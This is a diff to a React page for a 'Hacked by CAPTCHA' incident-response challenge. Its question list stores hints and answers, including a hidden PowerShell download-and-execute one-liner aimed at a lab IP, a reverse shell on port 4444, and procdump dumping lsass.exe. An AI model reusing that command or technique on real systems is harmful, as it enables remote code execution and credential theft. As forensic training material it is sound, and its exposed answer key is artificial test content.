@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState } from 'react';
 import { Link } from 'react-router-dom';
 import { ArrowLeft, CheckCircle2, XCircle, HelpCircle, Download, User, Droplet, Trophy } from 'lucide-react';
 import Confetti from 'react-confetti';
@@ -10,91 +10,115 @@ function HackedByCaptcha() {
       text: '1. What is the first payload command?',
       answer: 'powershell -nop -W hidden -noni -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString(\'http://172.20.120.18/help.ps1\')"',
       hint: 'The first payload command was executed via the Run dialog (Win + R).',
+      showHint: false,
+      userAnswer: '',
+      isCorrect: undefined,
     },
     {
       id: 2,
       text: '2. When was the command executed?',
       answer: '2025-02-23 14:41:17',
       hint: 'Check the registry key that stores a history of recently executed commands.',
+      showHint: false,
+      userAnswer: '',
+      isCorrect: undefined,
     },
     {
       id: 3,
       text: '3. What is the name of the second payload script?',
       answer: 'help.ps1',
       hint: 'The first payload command downloads and executes a script. Identify the name of this script from the command.',
+      showHint: false,
+      userAnswer: '',
+      isCorrect: undefined,
     },
     {
       id: 4,
       text: '4. What is the MD5 hash of the script?',
       answer: '51255D9A05327984236A91F11A196298',
       hint: 'If the script was transferred over the network, you can use a tool like Wireshark to capture the traffic and extract the file.',
+      showHint: false,
+      userAnswer: '',
+      isCorrect: undefined,
     },
     {
       id: 5,
       text: '5. What is the attacker\'s IP address?',
       answer: '172.20.120.18',
       hint: 'Check the script\'s content.',
+      showHint: false,
+      userAnswer: '',
+      isCorrect: undefined,
     },
     {
       id: 6,
       text: '6. What port did the attacker use as a listener?',
       answer: '4444',
       hint: 'Check the script\'s content.',
+      showHint: false,
+      userAnswer: '',
+      isCorrect: undefined,
     },
     {
       id: 7,
       text: '7. What type of attack was launched?',
       answer: 'Reverse shell',
       hint: 'The attacker used a technique to gain remote access to the compromised system. Think about the nature of the connection established.',
+      showHint: false,
+      userAnswer: '',
+      isCorrect: undefined,
     },
     {
       id: 8,
       text: '8. What was the first command executed by the attacker?',
       answer: 'whoami',
       hint: 'After gaining access, attackers often run commands to gather information about the compromised system.',
+      showHint: false,
+      userAnswer: '',
+      isCorrect: undefined,
     },
     {
       id: 9,
       text: '9. Which user got compromised?',
       answer: 'hackthehackers',
       hint: 'The compromised user is the account under which the malicious commands were executed.',
+      showHint: false,
+      userAnswer: '',
+      isCorrect: undefined,
     },
     {
       id: 10,
       text: '10. What tool did the attacker use?',
       answer: 'procdump',
       hint: 'The attacker used a tool to extract sensitive information from the compromised system. It is often a legitimate tool abused for malicious purposes.',
+      showHint: false,
+      userAnswer: '',
+      isCorrect: undefined,
     },
     {
       id: 11,
       text: '11. From which domain did the threat actor download the tool?',
       answer: 'sysinternals.com',
       hint: 'The domain is the source from which the attacker downloaded the tool.',
+      showHint: false,
+      userAnswer: '',
+      isCorrect: undefined,
     },
     {
       id: 12,
       text: '12. What was the target process of the attacker?',
       answer: 'lsass.exe',
       hint: 'The target process is a critical system process often targeted by attackers to extract sensitive information, such as credentials.',
+      showHint: false,
+      userAnswer: '',
+      isCorrect: undefined,
     },
   ]);
 
-  const [timeTaken, setTimeTaken] = useState(0);
-  const [timerRunning, setTimerRunning] = useState(true);
   const [hintsRemaining, setHintsRemaining] = useState(3);
   const [showConfetti, setShowConfetti] = useState(false);
   const [showSuccess, setShowSuccess] = useState(false);
   const [showError, setShowError] = useState(false);
-
-  useEffect(() => {
-    let interval;
-    if (timerRunning) {
-      interval = setInterval(() => {
-        setTimeTaken((prev) => prev + 1);
-      }, 1000);
-    }
-    return () => clearInterval(interval);
-  }, [timerRunning]);
 
   const allQuestionsAnswered = questions.every((q) => q.isCorrect !== undefined);
   const correctAnswersCount = questions.filter((q) => q.isCorrect).length;
@@ -107,7 +131,7 @@ function HackedByCaptcha() {
         if (q.id === id) {
           return {
             ...q,
-            userAnswer: answer.toLowerCase(),
+            userAnswer: answer,
             isCorrect: answer.toLowerCase() === q.answer.toLowerCase(),
           };
         }
@@ -131,23 +155,6 @@ function HackedByCaptcha() {
         })
       );
     }
-  };
-
-  const resetChallenge = () => {
-    setQuestions(
-      questions.map((q) => ({
-        ...q,
-        userAnswer: undefined,
-        isCorrect: undefined,
-        showHint: false,
-      }))
-    );
-    setTimeTaken(0);
-    setTimerRunning(true);
-    setHintsRemaining(3);
-    setShowConfetti(false);
-    setShowSuccess(false);
-    setShowError(false);
   };
 
   const handleComplete = () => {
@@ -191,12 +198,6 @@ function HackedByCaptcha() {
       <div className="max-w-4xl mx-auto px-4 py-12 -mt-16 relative z-10">
         <h1 className="text-3xl font-bold mb-8">Hacked by CAPTCHA Challenge</h1>
 
-        <div className="text-center mb-6">
-          <p className="text-gray-400">
-            Time Taken: {Math.floor(timeTaken / 60)}:{timeTaken % 60 < 10 ? `0${timeTaken % 60}` : timeTaken % 60}
-          </p>
-        </div>
-
         <div className="mb-6">
           <div className="text-lg font-semibold mb-2">Progress</div>
           <div className="w-full bg-primary-dark/20 h-4 rounded-full relative overflow-hidden">
@@ -220,15 +221,6 @@ function HackedByCaptcha() {
 
         <div className="text-gray-400 mb-6">
           Hints Remaining: {hintsRemaining}
-        </div>
-
-        <div className="text-center mb-6">
-          <button
-            onClick={resetChallenge}
-            className="bg-red-600 text-white py-2 px-4 rounded-lg hover:bg-red-700 transition-all"
-          >
-            Reset Challenge
-          </button>
         </div>
 
         <div className="bg-primary-dark/30 rounded-lg p-6 border border-primary-blue/20 mb-8">
@@ -299,15 +291,33 @@ function HackedByCaptcha() {
                       type="text"
                       className="bg-background border border-primary-blue/20 rounded-md px-4 py-2 focus:outline-none focus:border-primary-blue"
                       placeholder="Enter your answer"
-                      onChange={(e) => handleAnswerSubmit(question.id, e.target.value)}
+                      value={question.userAnswer}
+                      onChange={(e) =>
+                        setQuestions(
+                          questions.map((q) =>
+                            q.id === question.id
+                              ? { ...q, userAnswer: e.target.value }
+                              : q
+                          )
+                        )
+                      }
                     />
                     <button
-                      className="text-gray-500 hover:text-gray-400"
+                      className={`text-gray-500 hover:text-gray-400 transition-all ${
+                        hintsRemaining === 0 ? 'opacity-50 cursor-not-allowed' : ''
+                      }`}
                       onClick={() => toggleHint(question.id)}
+                      disabled={hintsRemaining === 0}
                     >
                       <HelpCircle className="w-5 h-5" />
                     </button>
-                    {question.userAnswer && (
+                    <button
+                      className="bg-blue-600 text-white py-2 px-4 rounded-lg hover:bg-blue-700 active:scale-95 transition-all"
+                      onClick={() => handleAnswerSubmit(question.id, question.userAnswer)}
+                    >
+                      Submit
+                    </button>
+                    {question.isCorrect !== undefined && (
                       question.isCorrect ? (
                         <CheckCircle2 className="w-6 h-6 text-green-500" />
                       ) : (
@@ -328,7 +338,7 @@ function HackedByCaptcha() {
         <div className="max-w-4xl mx-auto px-4 mt-8 text-center">
           <button
             onClick={handleComplete}
-            className="bg-green-600 text-white py-3 px-6 rounded-lg hover:bg-green-700 transition-all flex items-center justify-center space-x-2"
+            className="bg-green-600 text-white py-3 px-6 rounded-lg hover:bg-green-700 active:scale-95 transition-all flex items-center justify-center space-x-2"
           >
             <CheckCircle2 className="w-5 h-5" />
             <span>Complete Challenge</span>
@@ -367,7 +377,6 @@ function HackedByCaptcha() {
                 <div>
                   <p className="text-gray-400 text-sm">Created by:</p>
                   <div className="flex items-center space-x-2">
-
                     <p className="text-primary-blue hover:text-primary-blue/80 font-semibold">HackTheHackers</p>
                   </div>
                 </div>
